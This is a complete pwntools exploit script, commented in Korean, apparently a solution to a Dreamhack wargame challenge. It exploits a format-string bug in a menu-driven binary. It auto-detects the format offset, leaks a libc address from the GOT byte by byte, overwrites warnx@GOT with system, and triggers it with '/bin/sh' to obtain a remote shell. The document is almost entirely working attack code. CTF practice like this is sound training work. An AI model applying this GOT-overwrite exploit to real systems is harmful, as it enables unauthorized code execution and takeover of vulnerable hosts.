#!/usr/bin/env python3
from pwn import *

# ------------------------------------------------
# 환경 설정
# ------------------------------------------------
context.update(arch='amd64', os='linux')
context.log_level = 'info'   # 필요시 'debug'

BIN_PATH  = './string'         # 로컬 테스트 시 바이너리 경로
LIBC_PATH = './libc.so.6'    # 제공된 libc 경로

# 로컬/원격 전환
REMOTE = True
HOST, PORT = 'host8.dreamhack.games', 11822

elf  = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

MENU = b"1. Input\n2. Print\n3. Exit\n> "

def start():
    if REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BIN_PATH)

# 메뉴 래퍼
def do_input(p, data: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Input: ', data)

def do_print(p):
    p.sendlineafter(b'> ', b'2')

def roundtrip(p, payload: bytes) -> bytes:
    """
    payload를 넣고 Print까지 눌러, 다음 메뉴 프롬프트가 뜰 때까지의 출력을 반환
    """
    do_input(p, payload)
    do_print(p)
    out = p.recvuntil(MENU, drop=True)
    return out

# ------------------------------------------------
# 1) 포맷 인자 오프셋 자동 탐지
# ------------------------------------------------
def find_offset(p) -> int:
    def exec_fmt(s):
        out = roundtrip(p, s)
        return out
    fmt = FmtStr(execute_fmt=exec_fmt)
    log.success(f'format-string offset = {fmt.offset}')
    return fmt.offset

# ------------------------------------------------
# 2) 임의 바이트 읽기 (%.1s)로 메모리 누수
#    - 인자로 주소를 실어 보내기 위해 "fmt + 패딩 + p64(addr)" 형태 사용
# ------------------------------------------------
def leak_byte(p, fmt_off: int, addr: int) -> int:
    TAG = b'|END|'
    fmt  = f"%{fmt_off}$.1s{TAG.decode()}".encode()
    # 인자(주소들)는 8바이트 경계에 두는 편이 안전
    if len(fmt) % 8 != 0:
        fmt += b'A' * (8 - (len(fmt) % 8))
    payload = fmt + p64(addr)
    out = roundtrip(p, payload)

    # warnx 프리픽스 등이 섞일 수 있으므로 TAG 기준으로 파싱
    if TAG not in out:
        # 출력이 길면 마지막 TAG를 찾음
        # (TAG가 없으면 0x00으로 간주)
        return 0
    # TAG 직전 1바이트만 추출(없으면 0)
    idx = out.rfind(TAG)
    data = out[:idx]
    return data[-1] if len(data) > 0 else 0

def leak_u64(p, fmt_off: int, addr: int) -> int:
    bs = []
    for i in range(8):
        bval = leak_byte(p, fmt_off, addr + i)
        bs.append(bval)
    return u64(bytes(bs))

# ------------------------------------------------
# 3) 바이트 단위 쓰기 (%%hhn) - pwntools fmtstr_payload 활용
# ------------------------------------------------
def write_byte(p, fmt_off: int, addr: int, val: int):
    assert 0 <= val <= 0xff
    payload = fmtstr_payload(fmt_off, { addr: val }, write_size='byte')
    # read(0, buf, 255)이므로 길이 제한 내로 유지(안전빵으로 체크)
    if len(payload) > 250:
        # 너무 길다면 출력 문자 수를 줄이기 위해 numbwritten 힌트를 조금 주는 방법도 있음
        # 여기서는 보수적으로 assert
        log.warning(f'payload length = {len(payload)} (>250) at {hex(addr)}')
    roundtrip(p, payload)

def write_qword(p, fmt_off: int, addr: int, value: int):
    for i in range(8):
        write_byte(p, fmt_off, addr + i, (value >> (8*i)) & 0xff)

# ------------------------------------------------
# 메인 익스
# ------------------------------------------------
def main():
    p = start()

    # 1) 오프셋 탐지
    off = find_offset(p)

    # 2) libc 베이스 누수
    #
    #    GOT 엔트리 값을 직접 읽는 대신,
    #    "GOT 주소의 바이트들"을 문자열로 간주해 1바이트씩(%.1s) 읽어 조립
    #    -> printf/puts 등 임포트 심볼 중 하나 고름
    leak_sym = None
    for cand in ('printf', '__printf_chk', 'puts'):
        if cand in elf.got:
            leak_sym = cand
            break
    if not leak_sym:
        log.failure('no suitable GOT to leak (printf/__printf_chk/puts not found)')
        p.close()
        return

    got_addr = elf.got[leak_sym]
    log.info(f'leaking {leak_sym}@GOT at {hex(got_addr)} ...')

    func_addr = leak_u64(p, off, got_addr)
    log.success(f'{leak_sym}@libc = {hex(func_addr)}')

    libc.address = func_addr - libc.sym[leak_sym]
    log.success(f'libc base = {hex(libc.address)}')

    system = libc.sym['system']
    binsh  = next(libc.search(b'/bin/sh\x00'))

    log.success(f'system@libc = {hex(system)}')
    log.info(f'"/bin/sh" @libc = {hex(binsh)}')

    # 3) warnx@GOT → system 덮기
    if 'warnx' not in elf.got:
        log.failure('warnx@GOT not found in ELF (심볼명이 다르거나 정적으로 링크되었을 수 있음)')
        p.close()
        return

    warnx_got = elf.got['warnx']
    log.info(f'patching warnx@GOT {hex(warnx_got)} -> system {hex(system)} (byte-wise)')
    write_qword(p, off, warnx_got, system)
    log.success('GOT patched')

    # 4) 트리거: "/bin/sh" 입력 후 Print → warnx(buf) == system(buf)
    do_input(p, b"/bin/sh\x00")
    do_print(p)

    # 쉘 핸드오버
    p.interactive()

if __name__ == '__main__':
    main()
